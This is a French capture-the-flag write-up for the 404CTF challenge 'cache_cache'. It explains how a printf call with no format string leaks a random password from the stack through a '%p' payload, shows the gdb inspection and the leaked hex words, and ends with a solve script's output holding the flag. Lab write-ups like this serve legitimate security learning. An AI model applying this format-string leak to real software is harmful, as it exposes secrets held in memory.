Les infos classiques
```
ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 4.4.0, not stripped
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Aie.

Le code source fait plein de bordel inutilement mais la vulnérabilité est facile à trouver : 
```
fgets(local_88, 0x78, (FILE *)stdin);
printf(local_88);
```

`local_88` est un buffer de taille 120 (0x78) en hexa

Pas de buffer overflow ici (et de toute façon il y a un canary) mais printf est appelé sans format string, ce qui le rend vulnérable

On a 120 caractères pour écrire notre payload et spawn un shell en exploitant printf

Le binaire est statique, mais l'ASLR est activé

En se renseignant un peu, on trouve une [tactique sympa](https://nixhacker.com/case-of-format-string-in-64-bit-is-it-still-critical/) pour trouver les mots de passe sur la stack.

On va essayer d'afficher plein d'adresses avec un payload du genre `%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p`

On lance gdb (avec peda, on est pas maso) avant pour vérifier le mot de passe

`gdb ./cache_cache`

On place un breakpoint sur puts (parce que c'est la fonction appelée directement après la création du mot de passe, il y a donc des chances que ce dernier ne soit pas très loin en mémoire à ce moment-là) et on run

En observant les registres à l'endroit du breakpoint, on trouve un truc intéressant dans R9 :
`R9 : 0x7fffffffdb10 ("eu0nO<BvR%3s&3Q@%!1T")`
Notre mot de passe. Il va changer à chaque run donc il faut enregistrer toutes les données au cours de celle-ci.

On a trouvé notre password, maintenant on continue jusqu'au prochain arrêt
Le programme nous demande notre identité. On envoie le payload et il nous répond :

```
Veuillez décliner votre identité:
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Bonjour 0x7fffffffb9a0.(nil).0x4532c7.(nil).0x4c2880.0x7fffffffddd8.0x10041cb7e.0x540000004cb440.0x200000000.0x4.(nil).0x495008.0x495013.0x49502e.0x495049.0x76423c4f6e307565.0x4051332673332552.0x54312125.0x2.0x320000000b
```

Il s'arrête ensuite au puts suivant (on se fout un peu de ce qu'il y a cet endroit maintenant) puis nous demande le mot de passe, puts 2 fois encore et s'arrête.

Analysons les données renvoyées par le payload pour voir si on a pas réussi à leaker le mot de passe
On remarque la section `0x76423c4f6e307565.0x4051332673332552.0x54312125` (position 15 à 17 si on split sur le résultat sur '.')
Ça semble correspondre à des caractères imprimables (on voit dans la source que le mot de passe est composé de 20 caractères ASCII). Et coup de bol, il s'agit de 8 + 8 + 4 = 20 caractères.

On écrit un petit script (la fonction solve de solve.py) pour remettre les octets dans le bon ordre avant de les coller à la suite (64 bits, little endian je rappelle) et on récupère bien notre mot de passe : `b'eu0nO<BvR%3s&3Q@%!1T'`

On ajoute un main à notre script pour passer automatiquement le payload, découper le résultat et formater correctement les données, et en le lançant sur l'URL distante on obtient le flag :

```
$ ./solve.py
[+] Opening connection to challenge.404ctf.fr on port 31946: Done
Password found : b'STK0P*9q?hT^78}Ll1(('


Vérification du mot de passe en cours ...

Bonjour Monsieur Dupont. 

Comme toujours, nous sommes heureux de faire affaire avec vous.

Vous avez plusieurs paiements en attente à récupérer. Veuillez nous transmettre votre adresse ethereum de la manière prévue auparavant.



404CTF{13_10UP_D3V0r3_14_H411384rD3}



[*] Closed connection to challenge.404ctf.fr port 31946
```
